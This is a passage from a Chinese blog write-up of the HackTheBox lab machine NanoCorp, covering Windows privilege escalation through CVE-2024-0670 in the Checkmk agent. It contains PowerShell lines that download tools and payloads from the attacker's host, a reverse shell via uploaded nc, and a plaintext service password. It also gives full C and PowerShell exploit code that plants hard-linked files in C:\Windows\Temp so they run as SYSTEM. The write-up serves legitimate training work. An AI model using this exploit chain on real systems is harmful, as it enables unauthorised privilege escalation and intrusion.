http://&#x3C;your-ip>/winpeas64.exe\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content <span class=\"hljs-keyword\">and</span> has been blocked by your antivirus software.\n</code></pre>\n<p>但是可以通过 <code>webclient</code> 来上传</p>\n<pre><code class=\"hljs language-python\">$p=new-<span class=\"hljs-built_in\">object</span> system.net.webclient;$p.downloadfile(<span class=\"hljs-string\">'http://&#x3C;your-ip>/winpeas64.exe'</span>,<span class=\"hljs-string\">'C:\\tools\\winpeas64.exe'</span>)\n</code></pre>\n<p>能找到一些有趣的信息，一个前面没有扫描出来的端口 6556</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image10.png\" alt=\"image.png\"></p>\n<p>重新扫描一下 6556 端口，该端口状态为 <code>filtered</code> ，服务是 <code>checkmk-agent</code></p>\n<pre><code class=\"hljs language-python\">➜  NanoCorp nmap -p6556 nanocorp.htb -vv                        \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">13</span> 02:07 CST\nInitiating Ping Scan at 02:07\nScanning nanocorp.htb (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>) [<span class=\"hljs-number\">4</span> ports]\nCompleted Ping Scan at 02:07, <span class=\"hljs-number\">0.06</span>s elapsed (<span class=\"hljs-number\">1</span> total hosts)\nInitiating SYN Stealth Scan at 02:07\nScanning nanocorp.htb (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>) [<span class=\"hljs-number\">1</span> port]\nCompleted SYN Stealth Scan at 02:07, <span class=\"hljs-number\">0.44</span>s elapsed (<span class=\"hljs-number\">1</span> total ports)\nNmap scan report <span class=\"hljs-keyword\">for</span> nanocorp.htb (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.93</span>)\nHost <span class=\"hljs-keyword\">is</span> up, received echo-reply ttl <span class=\"hljs-number\">127</span> (<span class=\"hljs-number\">0.041</span>s latency).\nScanned at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">13</span> 02:07:04 CST <span class=\"hljs-keyword\">for</span> 1s\n\nPORT     STATE    SERVICE       REASON\n<span class=\"hljs-number\">6556</span>/tcp filtered checkmk-agent no-response\n\nRead data files <span class=\"hljs-keyword\">from</span>: /usr/share/nmap\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">0.66</span> seconds\n           Raw packets sent: <span class=\"hljs-number\">6</span> (240B) | Rcvd: <span class=\"hljs-number\">1</span> (28B)\n</code></pre>\n<p>尝试寻找一下 <code>checkmk</code> 的漏洞</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image11.png\" alt=\"image.png\"></p>\n<blockquote>\n<p><a href=\"https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/\">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/</a></p>\n</blockquote>\n<p>改文章表示可以通过 checkmk 来进行本地权限执行，并且示范系统是 Window，漏洞编号是 <code>CVE-2024-0670</code></p>\n<p>通过分析，大概就是：在某些情况下，该软件会在 <code>C:\\Windows\\Temp</code> 目录下创建临时文件，这些文件随后会被执行。攻击者可以利用这一点，预先将受写保护的恶意文件放置到该目录中。这些文件会由 Checkmk 以 SYSTEM 权限执行，从而使攻击者能够提升其权限。</p>\n<p>查看程序版本：</p>\n<pre><code class=\"hljs language-python\">PS C:\\> (Get-Item <span class=\"hljs-string\">\"C:\\Program Files (x86)\\checkmk\\service\\check_mk_agent.exe\"</span>).VersionInfo\n\nProductVersion   FileVersion      FileName                                                                              \n--------------   -----------      --------                                                                              \n<span class=\"hljs-number\">2.1</span><span class=\"hljs-number\">.0</span>p10         <span class=\"hljs-number\">2.1</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>          C:\\Program Files (x86)\\checkmk\\service\\check_mk_agent.exe  \n</code></pre>\n<p>并没有在修复版本中，是存在漏洞的</p>\n<ol>\n<li>\n<p>用户 <code>monitoring_svc</code> 没有查看 Temp 文件夹的权限，尝试切换到 <code>WEB_SVC</code> 的 shell</p>\n<p><code>WEB_SVC</code> 是可以进行访问的</p>\n<pre><code class=\"hljs language-python\">PS C:\\tools> ./RunasCs.exe WEB_SVC <span class=\"hljs-string\">'dksehdgh712!@#'</span> <span class=\"hljs-string\">'whoami'</span>\n\nnanocorp\\web_svc\n\nPS C:\\tools> ./RunasCs.exe WEB_SVC <span class=\"hljs-string\">'dksehdgh712!@#'</span> <span class=\"hljs-string\">'powershell.exe /c \"ls C:\\Windows\\Temp -Filter\"'</span>\n.......\n</code></pre>\n<p>本来想通过 <code>MSF</code> 弹 <code>WEB_SVC</code> 到 Kali 上，但是被杀毒干掉了</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image12.png\" alt=\"image.png\"></p>\n<p>这里上传 <code>nc</code> 来弹</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image13.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>因为杀毒，所以就不创建弹 shell 的程序了，直接读 <code>root.txt</code></p>\n<p>脚本由 AI 生成</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;stdio.h></span>    <span class=\"hljs-comment\">// For file operations (fopen, fread, fwrite, fclose, rename)</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;stdlib.h></span>   <span class=\"hljs-comment\">// For exit()</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;windows.h></span>  <span class=\"hljs-comment\">// For Windows-specific error handling (GetLastError, FormatMessageA)</span></span>\n\n<span class=\"hljs-comment\">// Buffer size, defined as 4KB. This is a common and efficient size for file I/O.</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> BUFFER_SIZE 4096 </span>\n\n<span class=\"hljs-comment\">// Error handling function remains unchanged, as it is very useful.</span>\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">print_error_message</span><span class=\"hljs-params\">(<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span>* prefix)</span> {\n    DWORD errorCode = GetLastError();\n    <span class=\"hljs-keyword\">if</span> (errorCode == <span class=\"hljs-number\">0</span>) {\n        <span class=\"hljs-comment\">// If there's no system error code, just print the custom message.</span>\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%s\\n\"</span>, prefix);\n        <span class=\"hljs-keyword\">return</span>;\n    }\n\n    LPSTR messageBuffer = <span class=\"hljs-literal\">NULL</span>;\n    FormatMessageA(\n        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n        <span class=\"hljs-literal\">NULL</span>, \n        errorCode, \n        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n        (LPSTR)&#x26;messageBuffer, \n        <span class=\"hljs-number\">0</span>, \n        <span class=\"hljs-literal\">NULL</span>\n    );\n\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%s: %s\"</span>, prefix, messageBuffer);\n    LocalFree(messageBuffer);\n}\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {\n    <span class=\"hljs-comment\">// Define source and destination file paths</span>\n    <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *sourcePath = <span class=\"hljs-string\">\"C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\"</span>;\n    <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *destPath = <span class=\"hljs-string\">\"C:\\\\tools\\\\sunset.txt\"</span>;\n    <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *backupPath = <span class=\"hljs-string\">\"C:\\\\tools\\\\sunset.txt.bak\"</span>;\n\n    FILE *sourceFile = <span class=\"hljs-literal\">NULL</span>;\n    FILE *destFile = <span class=\"hljs-literal\">NULL</span>;\n    FILE *checkFile = <span class=\"hljs-literal\">NULL</span>;\n\n    <span class=\"hljs-comment\">// --- NEW: Backup Logic ---</span>\n    <span class=\"hljs-comment\">// First, check if the destination file already exists.</span>\n    checkFile = fopen(destPath, <span class=\"hljs-string\">\"rb\"</span>);\n    <span class=\"hljs-keyword\">if</span> (checkFile != <span class=\"hljs-literal\">NULL</span>) {\n        <span class=\"hljs-comment\">// The file exists, so we must close it before trying to rename.</span>\n        fclose(checkFile);\n\n        <span class=\"hljs-comment\">// Rename the existing destination file to create a backup.</span>\n        <span class=\"hljs-keyword\">if</span> (rename(destPath, backupPath) != <span class=\"hljs-number\">0</span>) {\n            print_error_message(<span class=\"hljs-string\">\"Failed to create backup file\"</span>);\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>; <span class=\"hljs-comment\">// Exit with an error</span>\n        }\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Backup created at: %s\\n\"</span>, backupPath);\n    }\n    <span class=\"hljs-comment\">// If checkFile is NULL, it means the destination file doesn't exist, so we can just proceed.</span>\n\n    <span class=\"hljs-comment\">// 1. Open the source file (in binary read mode \"rb\")</span>\n    sourceFile = fopen(sourcePath, <span class=\"hljs-string\">\"rb\"</span>);\n    <span class=\"hljs-keyword\">if</span> (sourceFile == <span class=\"hljs-literal\">NULL</span>) {\n        print_error_message(<span class=\"hljs-string\">\"Failed to open source file\"</span>);\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>; <span class=\"hljs-comment\">// Abnormal program exit</span>\n    }\n\n    <span class=\"hljs-comment\">// 2. Create and open the destination file (in binary write mode \"wb\")</span>\n    <span class=\"hljs-comment\">// \"wb\" mode will overwrite the file if it exists.</span>\n    destFile = fopen(destPath, <span class=\"hljs-string\">\"wb\"</span>);\n    <span class=\"hljs-keyword\">if</span> (destFile == <span class=\"hljs-literal\">NULL</span>) {\n        print_error_message(<span class=\"hljs-string\">\"Failed to create destination file\"</span>);\n        fclose(sourceFile); <span class=\"hljs-comment\">// Ensure the successfully opened source file is closed before exiting</span>\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n    }\n\n    <span class=\"hljs-comment\">// 3. Loop to read and write, performing the file copy</span>\n    <span class=\"hljs-type\">char</span> buffer[BUFFER_SIZE];\n    <span class=\"hljs-type\">size_t</span> bytesRead;\n\n    <span class=\"hljs-comment\">// fread reads data from sourceFile into the buffer.</span>\n    <span class=\"hljs-comment\">// The loop continues as long as the number of bytes read (bytesRead) is greater than 0.</span>\n    <span class=\"hljs-keyword\">while</span> ((bytesRead = fread(buffer, <span class=\"hljs-number\">1</span>, BUFFER_SIZE, sourceFile)) > <span class=\"hljs-number\">0</span>) {\n        <span class=\"hljs-comment\">// fwrite writes data from the buffer to destFile.</span>\n        <span class=\"hljs-comment\">// Check if the number of bytes written equals the number of bytes read.</span>\n        <span class=\"hljs-keyword\">if</span> (fwrite(buffer, <span class=\"hljs-number\">1</span>, bytesRead, destFile) != bytesRead) {\n            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"An error occurred while writing to the destination file.\\n\"</span>);\n            fclose(sourceFile);\n            fclose(destFile);\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n        }\n    }\n\n    <span class=\"hljs-comment\">// Check if the loop ended because of a reading error</span>\n    <span class=\"hljs-keyword\">if</span> (ferror(sourceFile)) {\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"An error occurred while reading from the source file.\\n\"</span>);\n    } <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-comment\">// If there were no errors, the copy was successful</span>\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"File successfully copied to: %s\\n\"</span>, destPath);\n    }\n\n    <span class=\"hljs-comment\">// 4. Cleanup: Close both files</span>\n    fclose(sourceFile);\n    fclose(destFile);\n\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>; <span class=\"hljs-comment\">// Normal program exit</span>\n}\n\n</code></pre>\n<p>生成恶意程序</p>\n<pre><code class=\"hljs language-c\">➜  x86_64-w64-mingw32-gcc root.c -o root.exe -lkernel32\n</code></pre>\n</li>\n<li>\n<p>因为需要强制 <code>Checkmk</code> 写入并执行这些临时文件</p>\n<p>经观察，修复软件即可解决问题。可通过 Windows 图形用户界面或使用以下命令启动修复过程。</p>\n<pre><code class=\"hljs language-c\">PS C:\\tools> ls C:\\Windows\\Installer\\\n\n    Directory: C:\\Windows\\Installer\n\nMode                 LastWriteTime         Length Name                                                                  \n----                 -------------         ------ ----                                                                  \nd-----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">25</span> PM                {<span class=\"hljs-number\">6070B</span>E95-B84D<span class=\"hljs-number\">-40F</span>E<span class=\"hljs-number\">-8</span>ABD-C70B59F5A164}                                \nd-----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">17</span> PM                {<span class=\"hljs-number\">675</span>A6D5C-FF5A<span class=\"hljs-number\">-11</span>EF-AEA3<span class=\"hljs-number\">-1967</span>AD678D6D}                                \n-a----         <span class=\"hljs-number\">3</span>/<span class=\"hljs-number\">28</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">08</span> PM       <span class=\"hljs-number\">12637696</span> <span class=\"hljs-number\">1e6</span>f2.msi                                                             \n-a----         <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">2023</span>   <span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">16</span> AM         <span class=\"hljs-number\">184320</span> <span class=\"hljs-number\">387</span>c2.msi                                                             \n-a----         <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">2023</span>   <span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">21</span> AM         <span class=\"hljs-number\">184320</span> <span class=\"hljs-number\">387</span>c6.msi                                                             \n-a----         <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">2023</span>   <span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">35</span> AM         <span class=\"hljs-number\">192512</span> <span class=\"hljs-number\">387</span>ca.msi                                                             \n-a----         <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">2023</span>   <span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">39</span> AM         <span class=\"hljs-number\">192512</span> <span class=\"hljs-number\">387</span>ce.msi                                                             \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">24</span> PM       <span class=\"hljs-number\">60895232</span> <span class=\"hljs-number\">387</span>d1.msi                                                             \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">24</span> PM          <span class=\"hljs-number\">20480</span> SourceHash{<span class=\"hljs-number\">0025</span>DD72-A959<span class=\"hljs-number\">-45B</span>5-A0A3<span class=\"hljs-number\">-7</span>EFEB15A8050}                      \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">25</span> PM          <span class=\"hljs-number\">20480</span> SourceHash{<span class=\"hljs-number\">6070B</span>E95-B84D<span class=\"hljs-number\">-40F</span>E<span class=\"hljs-number\">-8</span>ABD-C70B59F5A164}                      \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">17</span> PM          <span class=\"hljs-number\">20480</span> SourceHash{<span class=\"hljs-number\">675</span>A6D5C-FF5A<span class=\"hljs-number\">-11</span>EF-AEA3<span class=\"hljs-number\">-1967</span>AD678D6D}                      \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">24</span> PM          <span class=\"hljs-number\">20480</span> SourceHash{<span class=\"hljs-number\">73F</span>77E4E<span class=\"hljs-number\">-5</span>A17<span class=\"hljs-number\">-46E5</span>-A5FC<span class=\"hljs-number\">-8</span>A061047725F}                      \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">24</span> PM          <span class=\"hljs-number\">20480</span> SourceHash{C2C59CAB<span class=\"hljs-number\">-8766</span><span class=\"hljs-number\">-4</span>ABD-A8EF<span class=\"hljs-number\">-1151</span>A36C41E5}                      \n-a----          <span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">24</span> PM          <span class=\"hljs-number\">20480</span> SourceHash{D5D19E2F<span class=\"hljs-number\">-7189</span><span class=\"hljs-number\">-42F</span>E<span class=\"hljs-number\">-8103</span><span class=\"hljs-number\">-92</span>CD1FA457C2}  \n</code></pre>\n<p>经过测试 <code>1e6f2.msi</code> 是该文件</p>\n<pre><code class=\"hljs language-c\">PS C:\\> get-process | findstr check\nget-process | findstr check\n    <span class=\"hljs-number\">234</span>      <span class=\"hljs-number\">15</span>     <span class=\"hljs-number\">3032</span>      <span class=\"hljs-number\">12792</span>              <span class=\"hljs-number\">5868</span>   <span class=\"hljs-number\">0</span> check_mk_agent\n    \nPS C:\\> msiexec /fa C:\\Windows\\Installer\\<span class=\"hljs-number\">1e6</span>f2.msi\nmsiexec /fa C:\\Windows\\Installer\\<span class=\"hljs-number\">1e6</span>f2.msi\n\nPS C:\\> get-process | findstr check\nget-process | findstr check\n    <span class=\"hljs-number\">236</span>      <span class=\"hljs-number\">15</span>     <span class=\"hljs-number\">3588</span>      <span class=\"hljs-number\">13236</span>              <span class=\"hljs-number\">6696</span>   <span class=\"hljs-number\">0</span> check_mk_agent            \n</code></pre>\n<p>编写生成临时文件脚本，脚本由 AI 生成</p>\n<pre><code class=\"hljs language-c\">&#x3C;#\n.SYNOPSIS\n    The ultimate script <span class=\"hljs-keyword\">for</span> creating thousands of file entries without consuming disk space.\n\n.DESCRIPTION\n    This script uses Hard Links to create thousands of file pointers to a single source file.\n    This method is extremely fast and consumes virtually no extra disk space, solving the\n    critical issue of disk bloat from file copying.\n\n    It runs in an infinite loop to ensure the files persist, includes a sleep interval to\n    prevent <span class=\"hljs-number\">100</span>% CPU usage, and is built <span class=\"hljs-keyword\">for</span> maximum performance and robustness.\n#>\n\n[CmdletBinding()]\nparam()\n\n# --- Configuration ---\n$sourceFile   = <span class=\"hljs-string\">\"C:\\tools\\root.exe\"</span>\n$targetFolder = <span class=\"hljs-string\">\"C:\\Windows\\Temp\"</span>\n$startRange   = <span class=\"hljs-number\">1000</span>\n$endRange     = <span class=\"hljs-number\">15000</span>\n$sleepSeconds = <span class=\"hljs-number\">5</span>  # Interval in seconds between each full check.\n# --- End of Configuration ---\n\n# --- Initial Cleanup ---\nWrite-Host <span class=\"hljs-string\">\"Performing initial cleanup of target files...\"</span>\ntry {\n    Get-ChildItem -Path <span class=\"hljs-string\">\"$targetFolder\\cmk_all_*.cmd\"</span> | Remove-Item -Force\n}\ncatch {\n    Write-Warning <span class=\"hljs-string\">\"Could not perform initial cleanup. Error: $($_.Exception.Message)\"</span>\n}\n\n# --- Main Infinite Loop ---\n<span class=\"hljs-keyword\">while</span> ($<span class=\"hljs-literal\">true</span>) {\n    Write-Host <span class=\"hljs-string\">\"Starting new Hard Link creation cycle at $(Get-Date)\"</span>\n\n    <span class=\"hljs-keyword\">if</span> (-not (Test-Path -Path $sourceFile -PathType Leaf)) {\n        Write-Error <span class=\"hljs-string\">\"CRITICAL: Source file '$sourceFile' not found. Sleeping for 60 seconds before retrying...\"</span>\n        Start-Sleep -Seconds <span class=\"hljs-number\">60</span>\n        <span class=\"hljs-keyword\">continue</span> \n    }\n\n    # --- High-Performance Hard Link Creation Loop ---\n    <span class=\"hljs-keyword\">for</span> ($i = $startRange; $i -le $endRange; $i++) {\n        $linkName = <span class=\"hljs-string\">\"$targetFolder\\cmk_all_${i}_1.cmd\"</span>\n        \n        # If the link/file already exists, skip to the next one to save time.\n        <span class=\"hljs-keyword\">if</span> (Test-Path -LiteralPath $linkName) {\n            <span class=\"hljs-keyword\">continue</span>\n        }\n        \n        try {\n            # Use the native <span class=\"hljs-string\">'fsutil'</span> command to create a hard link.\n            # This is the fastest and most space-efficient method.\n            # We use <span class=\"hljs-string\">'cmd /c'</span> to properly execute fsutil and handle output.\n            cmd /c fsutil hardlink create $linkName $sourceFile | Out-Null\n        }\n        catch {\n            Write-Warning <span class=\"hljs-string\">\"Failed to create hard link for number $i. Error: $($_.Exception.Message)\"</span>\n        }\n    }\n    \n    # IMPORTANT NOTE about Read-Only property on Hard Links:\n    # All hard links point to the SAME file data and metadata.\n    # If you <span class=\"hljs-built_in\">set</span> one link to read-only, the original file and ALL other links\n    # ALSO become read-only.\n    # We <span class=\"hljs-built_in\">set</span> it once on the source file, and all links will inherit it.\n    try {\n        (Get-Item -LiteralPath $sourceFile).IsReadOnly = $<span class=\"hljs-literal\">true</span>\n    }\n    catch {\n        Write-Warning <span class=\"hljs-string\">\"Could not set read-only attribute on source file. Error: $($_.Exception.Message)\"</span>\n    }\n\n    Write-Host <span class=\"hljs-string\">\"Cycle finished. Sleeping for $sleepSeconds seconds...\"</span>\n    Start-Sleep -Seconds $sleepSeconds\n}\n</code></pre>\n</li>\n<li>\n<p>准备好后开始利用</p>\n<p>来到 web_svc 的 <code>shell</code></p>\n<pre><code class=\"hljs language-c\">$p=new-object system.net.webclient;$p.downloadfile(<span class=\"hljs-string\">'http://&#x3C;your-ip>/root.exe'</span>,<span class=\"hljs-string\">'C:\\tools\\root.exe'</span>)\n$p=new-object system.net.webclient;$p.downloadfile(<span class=\"hljs-string\">'http://&#x3C;your-ip>/sunset.ps1'</span>,<span class=\"hljs-string\">'C:\\tools\\sunset.ps1'</span>)\n</code></pre>\n<p>首先运行 <code>sunset.ps1</code></p>\n<pre><code class=\"hljs language-c\">C:\\tools\\sunset.ps1\n</code></pre>\n<p>执行完毕后再通过 <code>msiexec</code> 调用 <code>1e6f2.msi</code></p>\n<pre><code class=\"hljs language-c\">msiexec /fa C:\\Windows\\Installer\\<span class=\"hljs-number\">1e6</span>f2.msi\n</code></pre>\n<p>最后应该就能看到文件了</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image14.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>总结</h2>\n<p>一开始漏洞有点难找，相关的玩意有点多。</p>\n<p>最后的利用点也是，很难看到存在一个没扫描到的端口，并且还是利用点。</p>","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","updated":"2025-11-14","tags":["HackTheBox","Windows","CVE-2025-24071","CVE-2024-0670","encrypt"],"categories":"靶机","comments":true,"description":"Season9 NanoCorp https://app.hackthebox.com/machines/NanoCorp Recon PortScan 枚举 80 端口 目录扫描 主站是看着没有什么的，尝试一下爆一下子域名 换个字典，爆破到存在 hire 子域名 CVE 2025 24071 将...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsKoi Stealer","title":"TheHackersLabs - Koi Stealer","date":"2025-12-06","isEncrypted":false,"year":"2025","month":"12","day":"06"},{"id":"HackMyVMSkid","title":"HackMyVM - Skid","date":"2025-12-03","isEncrypted":false,"year":"2025","month":"12","day":"03"},{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"}]},"__N_SSG":true}